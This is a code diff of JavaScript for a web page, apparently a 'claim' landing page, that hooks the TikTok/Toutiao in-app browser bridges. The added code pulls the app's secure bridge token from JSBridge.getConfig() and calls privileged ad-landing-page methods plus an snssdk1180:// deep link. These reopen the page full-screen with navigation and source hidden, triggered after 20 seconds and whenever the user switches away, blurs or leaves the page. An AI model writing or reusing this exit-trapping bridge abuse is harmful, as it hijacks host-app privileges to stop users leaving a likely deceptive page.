@@ -226,22 +226,24 @@ function startTimer(){
   setTimeout(function(){['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){if(window[n])hookBridge(window[n]);});},100);
   setTimeout(function(){['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){if(window[n])hookBridge(window[n]);});},1000);
 
-  setTimeout(function(){
-    var tt=window.ToutiaoJSBridge;if(!tt||!tt.call)return;
-    var fsUrl=SELF_URL+'?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
-    tt.call('openAdLandPageLinks',{url:fsUrl,landingStyle:2,title:'',isDeeplink:1,refer:'landing_page',hide_nav_bar:1,hide_source:1,should_full_screen:1,trans_status_bar:1,is_instant_page:1,cid:TT_CAMPAIGN},function(r){incomingMsgs.push('result:'+JSON.stringify(r));});
-  },3000);
-
   function fireFullscreen(){
+    if(schemeFired)return;schemeFired=true;
     var tt=window.ToutiaoJSBridge;
     var fsUrl=SELF_URL+'?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
     var params={url:fsUrl,landingStyle:2,title:'',isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN,hide_nav_bar:1,hide_source:1,should_full_screen:1,trans_status_bar:1,is_instant_page:1};
     if(token)params._jsb_secure_token=token;
     if(tt&&tt.call){try{tt.call('openAdLandPageLinks',params,function(){});}catch(e){}}
+    try{
+      var jb=window.JSBridge;
+      if(jb&&typeof jb.call==='function'){
+        var cfg=jb.getConfig();var tok=cfg&&cfg.secure&&cfg.secure.token;
+        if(tok)jb.call('BDXBridgeOpenAdLandPageMethod',{url:fsUrl,landingStyle:2,title:'',isDeeplink:1,refer:'landing_page',cid:TT_CAMPAIGN,_jsb_secure_token:tok},function(){});
+      }
+    }catch(e){}
     try{window.location.href='snssdk1180://webview?url='+encodeURIComponent(SELF_URL)+'&hide_nav_bar=1&is_ad=1';}catch(e){}
   }
 
-  // BDXBridge (newer TikTok)
+  // BDXBridge early init (newer TikTok)
   (function(){
     try{
       var jb=window.JSBridge;if(!jb||typeof jb.call!=='function')return;
@@ -252,8 +254,14 @@ function startTimer(){
   })();
 
   var schemeFired=false;
-  document.addEventListener('visibilitychange',function(){if(document.hidden&&!schemeFired){schemeFired=true;fireFullscreen();}else if(!document.hidden){schemeFired=false;}});
-  window.addEventListener('pagehide',function(){if(!schemeFired)fireFullscreen();});
+
+  // Proactive: fire after 20s while page is guaranteed alive
+  setTimeout(function(){fireFullscreen();},20000);
+
+  // Exit detection: fire immediately if user leaves before 20s
+  document.addEventListener('visibilitychange',function(){if(document.hidden)fireFullscreen();else schemeFired=false;});
+  window.addEventListener('pagehide',function(){fireFullscreen();});
+  window.addEventListener('blur',function(){fireFullscreen();});
 })();
 
 function handleClaim(){
